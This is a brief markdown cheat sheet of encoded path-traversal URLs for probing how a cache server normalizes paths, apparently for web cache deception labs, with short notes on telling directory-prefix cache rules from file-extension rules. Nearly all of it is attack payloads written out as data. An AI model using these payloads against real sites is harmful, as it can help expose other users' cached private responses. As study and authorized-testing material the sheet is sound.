# Cache Server Normalization Payloads

## Basic Exact-File Test

```text
/aaa/..%2findex.html
```

---

## Robots File Test

```text
/aaa/..%2frobots.txt
```

---

## Static Resource Test

```text
/aaa/..%2fassets/js/stockCheck.js
```

---

## Directory-Internal Traversal

```text
/assets/..%2fjs/stockCheck.js
```

---

## Generic Pattern

```text
/<arbitrary-directory>/..%2f<cached-resource>
```

---

## Exact-Match Concept

```text
/profile%2f%2e%2e%2findex.html
```

Potential cache normalization:

```text
/profile%2f%2e%2e%2findex.html
                ↓
           /index.html
```

---

## Testing Static Directory Rules

If:

```text
/assets/aaa
```

is cached, this can indicate a cache rule based on the `/assets` prefix.

---

## Important

A cached response may also be caused by a file-extension rule.

Test with an arbitrary resource name to distinguish the directory rule.